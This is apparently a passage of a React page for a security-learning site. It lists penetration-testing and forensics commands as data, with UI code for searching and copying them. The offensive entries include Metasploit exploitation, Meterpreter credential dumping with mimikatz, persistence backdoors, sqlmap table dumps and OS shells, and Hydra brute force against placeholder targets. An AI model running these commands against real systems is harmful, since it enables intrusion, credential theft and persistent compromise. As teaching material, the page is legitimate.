  { command: "set LPORT <port>", description: "Set listener port", category: "Configuration", difficulty: "beginner", example: "set LPORT 4444" },
  { command: "set payload <payload>", description: "Set exploit payload", category: "Configuration", difficulty: "beginner", example: "set payload windows/meterpreter/reverse_tcp" },
  { command: "setg <option> <value>", description: "Set global option (persists)", category: "Configuration", difficulty: "intermediate" },
  { command: "unset <option>", description: "Unset an option", category: "Configuration", difficulty: "beginner" },
  { command: "unsetg <option>", description: "Unset global option", category: "Configuration", difficulty: "intermediate" },
  
  // Exploitation
  { command: "exploit", description: "Run the exploit", category: "Exploitation", difficulty: "beginner", dangerous: true },
  { command: "run", description: "Run the module (alias for exploit)", category: "Exploitation", difficulty: "beginner", dangerous: true },
  { command: "exploit -j", description: "Run exploit as background job", category: "Exploitation", difficulty: "intermediate", dangerous: true },
  { command: "exploit -z", description: "Don't interact with session after success", category: "Exploitation", difficulty: "intermediate", dangerous: true },
  { command: "check", description: "Check if target is vulnerable", category: "Exploitation", difficulty: "intermediate" },
  { command: "jobs", description: "List running background jobs", category: "Exploitation", difficulty: "beginner" },
  { command: "jobs -K", description: "Kill all jobs", category: "Exploitation", difficulty: "intermediate" },
  
  // Meterpreter Basics
  { command: "sysinfo", description: "Get system information", category: "Meterpreter", difficulty: "beginner" },
  { command: "getuid", description: "Get current user", category: "Meterpreter", difficulty: "beginner" },
  { command: "getpid", description: "Get current process ID", category: "Meterpreter", difficulty: "beginner" },
  { command: "ps", description: "List running processes", category: "Meterpreter", difficulty: "beginner" },
  { command: "shell", description: "Drop into system shell", category: "Meterpreter", difficulty: "beginner" },
  { command: "background", description: "Background current session", category: "Meterpreter", difficulty: "beginner" },
  { command: "pwd", description: "Print working directory", category: "Meterpreter", difficulty: "beginner" },
  { command: "cd <dir>", description: "Change directory", category: "Meterpreter", difficulty: "beginner" },
  { command: "ls", description: "List files", category: "Meterpreter", difficulty: "beginner" },
  { command: "cat <file>", description: "Read file contents", category: "Meterpreter", difficulty: "beginner" },
  { command: "download <file>", description: "Download file to attacker", category: "Meterpreter", difficulty: "beginner" },
  { command: "upload <file>", description: "Upload file to target", category: "Meterpreter", difficulty: "beginner" },
  { command: "edit <file>", description: "Edit file on target", category: "Meterpreter", difficulty: "intermediate" },
  
  // Privilege Escalation
  { command: "getsystem", description: "Attempt to get SYSTEM privileges", category: "Privilege Escalation", difficulty: "intermediate", dangerous: true, tags: ["privesc"] },
  { command: "getprivs", description: "Get current privileges", category: "Privilege Escalation", difficulty: "beginner" },
  { command: "migrate <pid>", description: "Migrate to another process", category: "Privilege Escalation", difficulty: "intermediate", tags: ["privesc"] },
  { command: "use incognito", description: "Load incognito token module", category: "Privilege Escalation", difficulty: "advanced", tags: ["privesc"] },
  { command: "list_tokens -u", description: "List available tokens", category: "Privilege Escalation", difficulty: "advanced", tags: ["privesc"] },
  { command: "impersonate_token <token>", description: "Impersonate a token", category: "Privilege Escalation", difficulty: "advanced", dangerous: true, tags: ["privesc"] },
  { command: "run post/multi/recon/local_exploit_suggester", description: "Find local exploit suggestions", category: "Privilege Escalation", difficulty: "intermediate", tags: ["privesc"] },
  
  // Credential Harvesting
  { command: "hashdump", description: "Dump password hashes (Windows)", category: "Credential Harvesting", difficulty: "intermediate", dangerous: true, tags: ["credentials"] },
  { command: "run post/windows/gather/smart_hashdump", description: "Smart hash dump", category: "Credential Harvesting", difficulty: "intermediate", dangerous: true, tags: ["credentials"] },
  { command: "load kiwi", description: "Load mimikatz extension", category: "Credential Harvesting", difficulty: "advanced", tags: ["credentials"] },
  { command: "creds_all", description: "Retrieve all credentials (kiwi)", category: "Credential Harvesting", difficulty: "advanced", dangerous: true, tags: ["credentials"] },
  { command: "creds_msv", description: "Retrieve NTLM hashes (kiwi)", category: "Credential Harvesting", difficulty: "advanced", dangerous: true, tags: ["credentials"] },
  { command: "creds_wdigest", description: "Retrieve WDigest creds (kiwi)", category: "Credential Harvesting", difficulty: "advanced", dangerous: true, tags: ["credentials"] },
  { command: "run post/multi/gather/ssh_creds", description: "Gather SSH credentials", category: "Credential Harvesting", difficulty: "intermediate", tags: ["credentials"] },
  
  // Persistence
  { command: "run persistence -U -i 5 -p <port> -r <ip>", description: "Create persistent backdoor", category: "Persistence", difficulty: "advanced", dangerous: true, tags: ["persistence"] },
  { command: "run post/windows/manage/enable_rdp", description: "Enable RDP on target", category: "Persistence", difficulty: "advanced", dangerous: true, tags: ["persistence"] },
  { command: "run scheduleme -m 1 -c \"cmd.exe\"", description: "Create scheduled task", category: "Persistence", difficulty: "advanced", dangerous: true, tags: ["persistence"] },
  
  // Session Management
  { command: "sessions", description: "List active sessions", category: "Session Management", difficulty: "beginner" },
  { command: "sessions -i <id>", description: "Interact with session", category: "Session Management", difficulty: "beginner" },
  { command: "sessions -k <id>", description: "Kill a session", category: "Session Management", difficulty: "beginner" },
  { command: "sessions -K", description: "Kill all sessions", category: "Session Management", difficulty: "intermediate" },
  { command: "sessions -u <id>", description: "Upgrade shell to meterpreter", category: "Session Management", difficulty: "intermediate" },
  
  // Database
  { command: "db_status", description: "Check database connection", category: "Database", difficulty: "beginner" },
  { command: "workspace", description: "List workspaces", category: "Database", difficulty: "beginner" },
  { command: "workspace -a <name>", description: "Create new workspace", category: "Database", difficulty: "beginner" },
  { command: "workspace <name>", description: "Switch workspace", category: "Database", difficulty: "beginner" },
  { command: "hosts", description: "List discovered hosts", category: "Database", difficulty: "beginner" },
  { command: "services", description: "List discovered services", category: "Database", difficulty: "beginner" },
  { command: "vulns", description: "List discovered vulnerabilities", category: "Database", difficulty: "beginner" },
  { command: "creds", description: "List gathered credentials", category: "Database", difficulty: "beginner" },
  { command: "db_nmap <args>", description: "Run nmap and store results", category: "Database", difficulty: "intermediate", example: "db_nmap -sV -sC 192.168.1.0/24" },
  { command: "db_import <file>", description: "Import scan results (nmap, nessus)", category: "Database", difficulty: "intermediate" },
];

// Web Testing Commands
const webTestingCommands: Command[] = [
  // Directory Enumeration
  { command: "gobuster dir -u http://target -w wordlist.txt", description: "Directory brute force with gobuster", category: "Directory Enumeration", difficulty: "beginner", example: "gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/common.txt" },
  { command: "gobuster dir -u http://target -w wordlist.txt -x php,html,txt", description: "Gobuster with extensions", category: "Directory Enumeration", difficulty: "beginner" },
  { command: "feroxbuster -u http://target -w wordlist.txt", description: "Fast directory enumeration", category: "Directory Enumeration", difficulty: "beginner" },
  { command: "feroxbuster -u http://target --smart", description: "Feroxbuster smart mode", category: "Directory Enumeration", difficulty: "intermediate" },
  { command: "dirb http://target /usr/share/wordlists/dirb/common.txt", description: "Dirb directory scan", category: "Directory Enumeration", difficulty: "beginner" },
  { command: "dirsearch -u http://target -e php,html", description: "Dirsearch enumeration", category: "Directory Enumeration", difficulty: "beginner" },
  { command: "ffuf -u http://target/FUZZ -w wordlist.txt", description: "FFuf directory fuzzing", category: "Directory Enumeration", difficulty: "intermediate" },
  { command: "ffuf -u http://target/FUZZ -w wordlist.txt -fc 404", description: "FFuf excluding 404s", category: "Directory Enumeration", difficulty: "intermediate" },
  
  // Subdomain Enumeration
  { command: "subfinder -d example.com", description: "Find subdomains passively", category: "Subdomain Enumeration", difficulty: "beginner" },
  { command: "subfinder -d example.com -all", description: "Use all sources", category: "Subdomain Enumeration", difficulty: "intermediate" },
  { command: "amass enum -d example.com", description: "Amass subdomain enumeration", category: "Subdomain Enumeration", difficulty: "intermediate" },
  { command: "amass enum -d example.com -active", description: "Active subdomain enumeration", category: "Subdomain Enumeration", difficulty: "intermediate" },
  { command: "gobuster dns -d example.com -w subdomains.txt", description: "Gobuster DNS brute force", category: "Subdomain Enumeration", difficulty: "intermediate" },
  { command: "ffuf -u http://FUZZ.example.com -w subdomains.txt", description: "FFuf virtual host enumeration", category: "Subdomain Enumeration", difficulty: "intermediate" },
  { command: "dnsrecon -d example.com -t brt", description: "DNS brute force with dnsrecon", category: "Subdomain Enumeration", difficulty: "intermediate" },
  
  // SQL Injection
  { command: "sqlmap -u \"http://target?id=1\"", description: "Basic SQLi test", category: "SQL Injection", difficulty: "intermediate", dangerous: true, tags: ["sqli"] },
  { command: "sqlmap -u \"http://target?id=1\" --dbs", description: "Enumerate databases", category: "SQL Injection", difficulty: "intermediate", dangerous: true, tags: ["sqli"] },
  { command: "sqlmap -u \"http://target?id=1\" -D db --tables", description: "Enumerate tables", category: "SQL Injection", difficulty: "intermediate", dangerous: true, tags: ["sqli"] },
  { command: "sqlmap -u \"http://target?id=1\" -D db -T users --dump", description: "Dump table contents", category: "SQL Injection", difficulty: "intermediate", dangerous: true, tags: ["sqli"] },
  { command: "sqlmap -u \"http://target?id=1\" --os-shell", description: "Get OS shell via SQLi", category: "SQL Injection", difficulty: "advanced", dangerous: true, tags: ["sqli"] },
  { command: "sqlmap -u \"http://target?id=1\" --batch --risk=3 --level=5", description: "Aggressive SQLi testing", category: "SQL Injection", difficulty: "advanced", dangerous: true, tags: ["sqli"] },
  { command: "sqlmap -r request.txt", description: "SQLi from request file", category: "SQL Injection", difficulty: "intermediate", tags: ["sqli"] },
  { command: "sqlmap -u \"http://target\" --forms", description: "Test all forms for SQLi", category: "SQL Injection", difficulty: "intermediate", dangerous: true, tags: ["sqli"] },
  
  // XSS Testing
  { command: "xsstrike -u \"http://target?param=test\"", description: "XSS vulnerability scanner", category: "XSS Testing", difficulty: "intermediate", dangerous: true, tags: ["xss"] },
  { command: "dalfox url \"http://target?param=test\"", description: "Dalfox XSS scanner", category: "XSS Testing", difficulty: "intermediate", dangerous: true, tags: ["xss"] },
  { command: "dalfox url \"http://target?param=test\" --blind <callback>", description: "Blind XSS testing", category: "XSS Testing", difficulty: "advanced", dangerous: true, tags: ["xss"] },
  { command: "kxss -urls targets.txt", description: "Bulk XSS parameter check", category: "XSS Testing", difficulty: "intermediate", tags: ["xss"] },
  
  // Vulnerability Scanning
  { command: "nikto -h http://target", description: "Web server vulnerability scan", category: "Vulnerability Scanning", difficulty: "beginner" },
  { command: "nikto -h http://target -Tuning x", description: "Nikto reverse proxy tuning", category: "Vulnerability Scanning", difficulty: "intermediate" },
  { command: "nuclei -u http://target", description: "Nuclei vulnerability scan", category: "Vulnerability Scanning", difficulty: "intermediate" },
  { command: "nuclei -u http://target -t cves/", description: "Scan for specific CVEs", category: "Vulnerability Scanning", difficulty: "intermediate" },
  { command: "wpscan --url http://target", description: "WordPress vulnerability scan", category: "Vulnerability Scanning", difficulty: "beginner" },
  { command: "wpscan --url http://target --enumerate vp", description: "Enumerate vulnerable plugins", category: "Vulnerability Scanning", difficulty: "intermediate" },
  { command: "wpscan --url http://target --enumerate u", description: "Enumerate WordPress users", category: "Vulnerability Scanning", difficulty: "intermediate" },
  { command: "joomscan -u http://target", description: "Joomla vulnerability scan", category: "Vulnerability Scanning", difficulty: "beginner" },
  { command: "droopescan scan drupal -u http://target", description: "Drupal vulnerability scan", category: "Vulnerability Scanning", difficulty: "beginner" },
  
  // Web Proxies & Interception
  { command: "curl -x http://127.0.0.1:8080 http://target", description: "Route through Burp/proxy", category: "Web Proxies", difficulty: "beginner" },
  { command: "mitmproxy -p 8080", description: "Start mitmproxy interceptor", category: "Web Proxies", difficulty: "intermediate" },
  { command: "mitmweb -p 8080", description: "Start mitmproxy web interface", category: "Web Proxies", difficulty: "intermediate" },
  { command: "curl -k https://target", description: "Ignore SSL certificate errors", category: "Web Proxies", difficulty: "beginner" },
  
  // HTTP Methods & Headers
  { command: "curl -X OPTIONS http://target", description: "Check allowed HTTP methods", category: "HTTP Analysis", difficulty: "beginner" },
  { command: "curl -I http://target", description: "Get HTTP headers only", category: "HTTP Analysis", difficulty: "beginner" },
  { command: "curl -v http://target", description: "Verbose HTTP request", category: "HTTP Analysis", difficulty: "beginner" },
  { command: "curl -H \"X-Forwarded-For: 127.0.0.1\" http://target", description: "Custom header injection", category: "HTTP Analysis", difficulty: "intermediate" },
  { command: "curl -d \"user=admin&pass=admin\" http://target/login", description: "POST form data", category: "HTTP Analysis", difficulty: "beginner" },
  { command: "curl -b \"session=abc123\" http://target", description: "Send cookies", category: "HTTP Analysis", difficulty: "beginner" },
  
  // API Testing
  { command: "curl -H \"Content-Type: application/json\" -d '{\"key\":\"value\"}' http://api/endpoint", description: "POST JSON to API", category: "API Testing", difficulty: "beginner" },
  { command: "curl -H \"Authorization: Bearer token\" http://api/endpoint", description: "API with bearer token", category: "API Testing", difficulty: "beginner" },
  { command: "postman collection run collection.json", description: "Run Postman collection", category: "API Testing", difficulty: "intermediate" },
  { command: "wfuzz -z file,wordlist.txt --hc 404 http://target/api/FUZZ", description: "API endpoint fuzzing", category: "API Testing", difficulty: "intermediate" },
];

// Password Attack Commands
const passwordCommands: Command[] = [
  // Hash Cracking - Hashcat
  { command: "hashcat -m 0 hash.txt wordlist.txt", description: "Crack MD5 hashes", category: "Hashcat", difficulty: "beginner", tags: ["cracking"] },
  { command: "hashcat -m 1000 hash.txt wordlist.txt", description: "Crack NTLM hashes", category: "Hashcat", difficulty: "beginner", tags: ["cracking"] },
  { command: "hashcat -m 1800 hash.txt wordlist.txt", description: "Crack SHA-512 Unix hashes", category: "Hashcat", difficulty: "beginner", tags: ["cracking"] },
  { command: "hashcat -m 500 hash.txt wordlist.txt", description: "Crack MD5crypt hashes", category: "Hashcat", difficulty: "beginner", tags: ["cracking"] },
  { command: "hashcat -m 3200 hash.txt wordlist.txt", description: "Crack bcrypt hashes", category: "Hashcat", difficulty: "intermediate", tags: ["cracking"] },
  { command: "hashcat -m 13100 hash.txt wordlist.txt", description: "Crack Kerberos TGS (Kerberoast)", category: "Hashcat", difficulty: "intermediate", tags: ["cracking"] },
  { command: "hashcat -m 18200 hash.txt wordlist.txt", description: "Crack AS-REP (ASREP roast)", category: "Hashcat", difficulty: "intermediate", tags: ["cracking"] },
  { command: "hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a", description: "Brute force all chars (6 len)", category: "Hashcat", difficulty: "intermediate", tags: ["cracking"] },
  { command: "hashcat -m 0 hash.txt wordlist.txt -r rules/best64.rule", description: "Crack with rules", category: "Hashcat", difficulty: "intermediate", tags: ["cracking"] },
  { command: "hashcat --show hash.txt", description: "Show cracked hashes", category: "Hashcat", difficulty: "beginner" },
  { command: "hashcat -m 0 hash.txt --username", description: "Hash file includes username", category: "Hashcat", difficulty: "intermediate" },
  
  // Hash Cracking - John
  { command: "john hash.txt", description: "Crack with default wordlist", category: "John the Ripper", difficulty: "beginner", tags: ["cracking"] },
  { command: "john --wordlist=wordlist.txt hash.txt", description: "Crack with custom wordlist", category: "John the Ripper", difficulty: "beginner", tags: ["cracking"] },
  { command: "john --format=raw-md5 hash.txt", description: "Specify hash format", category: "John the Ripper", difficulty: "beginner", tags: ["cracking"] },
  { command: "john --format=nt hash.txt", description: "Crack NTLM hashes", category: "John the Ripper", difficulty: "beginner", tags: ["cracking"] },
  { command: "john --show hash.txt", description: "Show cracked passwords", category: "John the Ripper", difficulty: "beginner" },
  { command: "john --rules --wordlist=wordlist.txt hash.txt", description: "Apply word mangling rules", category: "John the Ripper", difficulty: "intermediate", tags: ["cracking"] },
  { command: "unshadow passwd shadow > hashes.txt", description: "Combine passwd and shadow", category: "John the Ripper", difficulty: "beginner" },
  { command: "john --incremental hash.txt", description: "Brute force mode", category: "John the Ripper", difficulty: "intermediate", tags: ["cracking"] },
  
  // Online Brute Force - Hydra
  { command: "hydra -l admin -P wordlist.txt target ssh", description: "SSH brute force", category: "Hydra", difficulty: "intermediate", dangerous: true, tags: ["brute"] },
  { command: "hydra -L users.txt -P pass.txt target ssh", description: "SSH with user & pass lists", category: "Hydra", difficulty: "intermediate", dangerous: true, tags: ["brute"] },
  { command: "hydra -l admin -P wordlist.txt target ftp", description: "FTP brute force", category: "Hydra", difficulty: "intermediate", dangerous: true, tags: ["brute"] },
  { command: "hydra -l admin -P wordlist.txt target rdp", description: "RDP brute force", category: "Hydra", difficulty: "intermediate", dangerous: true, tags: ["brute"] },
  { command: "hydra -l admin -P wordlist.txt target smb", description: "SMB brute force", category: "Hydra", difficulty: "intermediate", dangerous: true, tags: ["brute"] },
  { command: "hydra -l admin -P wordlist.txt target mysql", description: "MySQL brute force", category: "Hydra", difficulty: "intermediate", dangerous: true, tags: ["brute"] },
  { command: "hydra -l admin -P wordlist.txt target http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\"", description: "HTTP POST form brute force", category: "Hydra", difficulty: "advanced", dangerous: true, tags: ["brute"] },
  { command: "hydra -l admin -P wordlist.txt target http-get /admin", description: "HTTP Basic auth brute force", category: "Hydra", difficulty: "intermediate", dangerous: true, tags: ["brute"] },
  { command: "hydra -t 4 -l admin -P wordlist.txt target ssh", description: "Limit to 4 threads", category: "Hydra", difficulty: "intermediate", dangerous: true, tags: ["brute"] },
  
  // Wordlist Generation
  { command: "cewl http://target -d 2 -m 5 -w wordlist.txt", description: "Generate wordlist from website", category: "Wordlist Generation", difficulty: "beginner" },
  { command: "cewl http://target --with-numbers", description: "Include words with numbers", category: "Wordlist Generation", difficulty: "beginner" },
  { command: "crunch 6 8 abc123 -o wordlist.txt", description: "Generate all combos (6-8 chars)", category: "Wordlist Generation", difficulty: "intermediate" },
  { command: "crunch 8 8 -t @@@@%%%% -o wordlist.txt", description: "Pattern: 4 letters + 4 digits", category: "Wordlist Generation", difficulty: "intermediate" },
  { command: "cupp -i", description: "Interactive profile-based wordlist", category: "Wordlist Generation", difficulty: "beginner" },
  { command: "kwprocessor -z basewords.txt", description: "Keyboard walk generator", category: "Wordlist Generation", difficulty: "advanced" },
  
  // Hash Identification
  { command: "hashid <hash>", description: "Identify hash type", category: "Hash Identification", difficulty: "beginner" },
  { command: "hashid -m <hash>", description: "Show hashcat mode", category: "Hash Identification", difficulty: "beginner" },
  { command: "hash-identifier", description: "Interactive hash identifier", category: "Hash Identification", difficulty: "beginner" },
  { command: "nth --hash <hash>", description: "Name That Hash identifier", category: "Hash Identification", difficulty: "beginner" },
  
  // Other Tools
  { command: "medusa -h target -u admin -P wordlist.txt -M ssh", description: "Medusa SSH brute force", category: "Other Tools", difficulty: "intermediate", dangerous: true, tags: ["brute"] },
  { command: "ncrack -p 22 --user admin -P wordlist.txt target", description: "Ncrack SSH brute force", category: "Other Tools", difficulty: "intermediate", dangerous: true, tags: ["brute"] },
  { command: "patator ssh_login host=target user=admin password=FILE0 0=wordlist.txt", description: "Patator SSH brute force", category: "Other Tools", difficulty: "advanced", dangerous: true, tags: ["brute"] },
  { command: "crackmapexec smb target -u admin -p wordlist.txt", description: "CrackMapExec SMB spray", category: "Other Tools", difficulty: "intermediate", dangerous: true, tags: ["brute"] },
  { command: "kerbrute userenum -d domain.local users.txt", description: "Kerberos user enumeration", category: "Other Tools", difficulty: "intermediate", tags: ["recon"] },
  { command: "kerbrute bruteuser -d domain.local wordlist.txt username", description: "Kerberos password spray", category: "Other Tools", difficulty: "intermediate", dangerous: true, tags: ["brute"] },
];

// Forensics & IR Commands
const forensicsCommands: Command[] = [
  // Disk Imaging
  { command: "dd if=/dev/sda of=disk.img bs=4M", description: "Create disk image", category: "Disk Imaging", difficulty: "beginner" },
  { command: "dd if=/dev/sda of=disk.img bs=4M status=progress", description: "Disk image with progress", category: "Disk Imaging", difficulty: "beginner" },
  { command: "dc3dd if=/dev/sda of=disk.img hash=md5 log=imaging.log", description: "Forensic imaging with DC3DD", category: "Disk Imaging", difficulty: "intermediate" },
  { command: "ewfacquire /dev/sda", description: "Create EnCase image (.E01)", category: "Disk Imaging", difficulty: "intermediate" },
  { command: "md5sum disk.img", description: "Calculate MD5 hash", category: "Disk Imaging", difficulty: "beginner" },
  { command: "sha256sum disk.img", description: "Calculate SHA256 hash", category: "Disk Imaging", difficulty: "beginner" },
  
  // Memory Forensics
  { command: "lime -p", description: "Capture Linux memory", category: "Memory Forensics", difficulty: "intermediate" },
  { command: "vol.py -f memory.raw imageinfo", description: "Volatility: identify profile", category: "Memory Forensics", difficulty: "intermediate" },
  { command: "vol.py -f memory.raw --profile=Win10x64 pslist", description: "List processes", category: "Memory Forensics", difficulty: "intermediate" },
  { command: "vol.py -f memory.raw --profile=Win10x64 pstree", description: "Process tree view", category: "Memory Forensics", difficulty: "intermediate" },
  { command: "vol.py -f memory.raw --profile=Win10x64 netscan", description: "Network connections", category: "Memory Forensics", difficulty: "intermediate" },
  { command: "vol.py -f memory.raw --profile=Win10x64 filescan", description: "Scan for files in memory", category: "Memory Forensics", difficulty: "intermediate" },
  { command: "vol.py -f memory.raw --profile=Win10x64 dumpfiles -Q 0x... -D output/", description: "Extract file from memory", category: "Memory Forensics", difficulty: "advanced" },
  { command: "vol.py -f memory.raw --profile=Win10x64 hashdump", description: "Dump password hashes", category: "Memory Forensics", difficulty: "advanced", tags: ["credentials"] },
  { command: "vol.py -f memory.raw --profile=Win10x64 malfind", description: "Find injected code", category: "Memory Forensics", difficulty: "advanced", tags: ["malware"] },
  { command: "vol.py -f memory.raw --profile=Win10x64 cmdscan", description: "Extract command history", category: "Memory Forensics", difficulty: "intermediate" },
  
  // File Analysis
  { command: "file suspicious_file", description: "Identify file type", category: "File Analysis", difficulty: "beginner" },
  { command: "strings suspicious_file", description: "Extract printable strings", category: "File Analysis", difficulty: "beginner" },
  { command: "strings -n 10 suspicious_file", description: "Strings minimum 10 chars", category: "File Analysis", difficulty: "beginner" },
  { command: "hexdump -C suspicious_file | head", description: "Hex dump of file", category: "File Analysis", difficulty: "beginner" },
  { command: "xxd suspicious_file | head", description: "Hex dump with xxd", category: "File Analysis", difficulty: "beginner" },
  { command: "binwalk suspicious_file", description: "Analyze embedded files", category: "File Analysis", difficulty: "intermediate" },
  { command: "binwalk -e suspicious_file", description: "Extract embedded files", category: "File Analysis", difficulty: "intermediate" },
  { command: "foremost -i disk.img -o output/", description: "Carve files from image", category: "File Analysis", difficulty: "intermediate" },
  { command: "scalpel -c scalpel.conf -o output/ disk.img", description: "Advanced file carving", category: "File Analysis", difficulty: "intermediate" },
  { command: "exiftool suspicious_file", description: "Extract metadata", category: "File Analysis", difficulty: "beginner" },
  { command: "pdfparser.py suspicious.pdf", description: "Parse PDF structure", category: "File Analysis", difficulty: "intermediate", tags: ["malware"] },
  { command: "olevba malicious.doc", description: "Extract VBA macros", category: "File Analysis", difficulty: "intermediate", tags: ["malware"] },
  
  // Log Analysis
  { command: "grep -r \"Failed password\" /var/log/auth.log", description: "Find failed logins", category: "Log Analysis", difficulty: "beginner" },
  { command: "grep -r \"Accepted\" /var/log/auth.log", description: "Find successful logins", category: "Log Analysis", difficulty: "beginner" },
  { command: "last -f /var/log/wtmp", description: "Show login history", category: "Log Analysis", difficulty: "beginner" },
  { command: "lastlog", description: "Show last login for all users", category: "Log Analysis", difficulty: "beginner" },
  { command: "journalctl --since \"1 hour ago\"", description: "Recent system logs", category: "Log Analysis", difficulty: "beginner" },
  { command: "journalctl -u sshd --since today", description: "SSH service logs today", category: "Log Analysis", difficulty: "beginner" },
  { command: "ausearch -m USER_LOGIN -ts today", description: "Audit log for logins", category: "Log Analysis", difficulty: "intermediate" },
  { command: "zcat /var/log/*.gz | grep -i error", description: "Search compressed logs", category: "Log Analysis", difficulty: "intermediate" },
  { command: "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624}", description: "Windows successful logons (PS)", category: "Log Analysis", difficulty: "intermediate" },
  { command: "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625}", description: "Windows failed logons (PS)", category: "Log Analysis", difficulty: "intermediate" },
  
  // Timeline Analysis
  { command: "mactime -b bodyfile.txt -d", description: "Create timeline from bodyfile", category: "Timeline Analysis", difficulty: "advanced" },
  { command: "fls -r -m / disk.img > bodyfile.txt", description: "Create bodyfile from image", category: "Timeline Analysis", difficulty: "advanced" },
  { command: "log2timeline.py timeline.plaso disk.img", description: "Plaso timeline creation", category: "Timeline Analysis", difficulty: "advanced" },
  { command: "psort.py -o l2tcsv timeline.plaso -w timeline.csv", description: "Export Plaso timeline", category: "Timeline Analysis", difficulty: "advanced" },
  
  // Network Forensics
  { command: "tcpdump -r capture.pcap", description: "Read pcap file", category: "Network Forensics", difficulty: "beginner" },
  { command: "tcpdump -r capture.pcap -n host 192.168.1.1", description: "Filter by host", category: "Network Forensics", difficulty: "beginner" },
  { command: "tshark -r capture.pcap -Y \"http.request\"", description: "Extract HTTP requests", category: "Network Forensics", difficulty: "intermediate" },
  { command: "tshark -r capture.pcap -T fields -e http.host -e http.request.uri", description: "Extract HTTP URLs", category: "Network Forensics", difficulty: "intermediate" },
  { command: "zeek -r capture.pcap", description: "Process pcap with Zeek", category: "Network Forensics", difficulty: "intermediate" },
  { command: "NetworkMiner.exe capture.pcap", description: "GUI-based pcap analysis", category: "Network Forensics", difficulty: "beginner" },
  
  // Malware Analysis
  { command: "clamav -r /suspicious/", description: "Scan with ClamAV", category: "Malware Analysis", difficulty: "beginner", tags: ["malware"] },
  { command: "yara -r rules.yar /suspicious/", description: "YARA rule scanning", category: "Malware Analysis", difficulty: "intermediate", tags: ["malware"] },
  { command: "objdump -d malware", description: "Disassemble binary", category: "Malware Analysis", difficulty: "advanced", tags: ["malware"] },
  { command: "strace ./malware", description: "Trace system calls", category: "Malware Analysis", difficulty: "intermediate", tags: ["malware"], dangerous: true },
  { command: "ltrace ./malware", description: "Trace library calls", category: "Malware Analysis", difficulty: "intermediate", tags: ["malware"], dangerous: true },
  { command: "radare2 malware", description: "Binary analysis with r2", category: "Malware Analysis", difficulty: "advanced", tags: ["malware"] },
  { command: "cutter malware", description: "GUI disassembler (Ghidra/r2)", category: "Malware Analysis", difficulty: "advanced", tags: ["malware"] },
  { command: "floss malware", description: "Extract obfuscated strings", category: "Malware Analysis", difficulty: "intermediate", tags: ["malware"] },
];

export default function CommandsPage() {
  const theme = useTheme();
  const navigate = useNavigate();
  const [selectedTab, setSelectedTab] = useState(0);
  const [searchQuery, setSearchQuery] = useState("");
  const [copiedCommand, setCopiedCommand] = useState<string | null>(null);

  const getCurrentCommands = () => {
    switch (selectedTab) {
      case 0: return linuxCommands;
      case 1: return powershellCommands;
      case 2: return wiresharkFilters;
      case 3: return nmapCommands;
      case 4: return metasploitCommands;
      case 5: return webTestingCommands;
      case 6: return passwordCommands;
      case 7: return forensicsCommands;
      default: return [];
    }
  };

  const filteredCommands = useMemo(() => {
    const commands = getCurrentCommands();
    if (!searchQuery.trim()) return commands;
    const query = searchQuery.toLowerCase();
    return commands.filter(
      (cmd) =>
        cmd.command.toLowerCase().includes(query) ||
        cmd.description.toLowerCase().includes(query) ||
        cmd.category.toLowerCase().includes(query) ||
        (cmd.tags && cmd.tags.some((tag) => tag.toLowerCase().includes(query)))
    );
  }, [selectedTab, searchQuery]);

  const getDifficultyColor = (difficulty?: string) => {
    switch (difficulty) {
      case "beginner": return "#10b981";
      case "intermediate": return "#f59e0b";
      case "advanced": return "#ef4444";
      default: return "#64748b";
    }
  };

  const categories = useMemo(() => {
    return [...new Set(getCurrentCommands().map((c) => c.category))];
  }, [selectedTab]);

  const copyToClipboard = (command: string) => {
    navigator.clipboard.writeText(command);
    setCopiedCommand(command);
    setTimeout(() => setCopiedCommand(null), 2000);
  };

  const getTabColor = () => {
    switch (selectedTab) {
      case 0: return "#f97316"; // Linux orange
      case 1: return "#0078d4"; // PowerShell blue
      case 2: return "#6366f1"; // Wireshark purple
      case 3: return "#10b981"; // Nmap green
      case 4: return "#dc2626"; // Metasploit red
      case 5: return "#0ea5e9"; // Web testing cyan
      case 6: return "#a855f7"; // Password purple
      case 7: return "#64748b"; // Forensics slate
      default: return theme.palette.primary.main;
    }
  };

  return (
    <LearnPageLayout pageTitle="Security Commands Reference" pageContext={pageContext}>
    <Container maxWidth="lg" sx={{ py: 4 }}>
      {/* Back Button */}
      <IconButton onClick={() => navigate("/learn")} sx={{ mb: 2 }}>
        <ArrowBackIcon />
      </IconButton>

      {/* Header */}
      <Box sx={{ mb: 5 }}>
        <Typography
          variant="h3"
          sx={{
            fontWeight: 800,
            mb: 2,
            background: `linear-gradient(135deg, #f97316, #0078d4, #6366f1, #10b981)`,
            backgroundClip: "text",
            WebkitBackgroundClip: "text",
            WebkitTextFillColor: "transparent",
          }}
        >
          💻 Security Commands Reference
        </Typography>
        <Typography variant="h6" color="text.secondary" sx={{ maxWidth: 900 }}>
          Essential security commands for penetration testing and digital forensics. Includes Linux, PowerShell, Wireshark, Nmap, Metasploit, Web Testing, Password Attacks, and Forensics tools. Click any command to copy.
        </Typography>
      </Box>

      {/* Tabs */}
      <Paper sx={{ borderRadius: 3, mb: 4 }}>
        <Tabs
          value={selectedTab}
          onChange={(_, v) => { setSelectedTab(v); setSearchQuery(""); }}
          variant="scrollable"
          scrollButtons="auto"
          sx={{
            borderBottom: 1,
            borderColor: "divider",
            "& .MuiTab-root": { fontWeight: 600, textTransform: "none", minHeight: 60, minWidth: "auto", px: 2 },
            "& .Mui-selected": { color: `${getTabColor()} !important` },
            "& .MuiTabs-indicator": { bgcolor: getTabColor() },
          }}
        >
          <Tab label={<Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>🐧 Linux</Box>} />
          <Tab label={<Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>⚡ PowerShell</Box>} />
          <Tab label={<Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>🦈 Wireshark</Box>} />
          <Tab label={<Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>🔍 Nmap</Box>} />
          <Tab label={<Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>💀 Metasploit</Box>} />
          <Tab label={<Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>🌐 Web</Box>} />
          <Tab label={<Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>🔐 Passwords</Box>} />
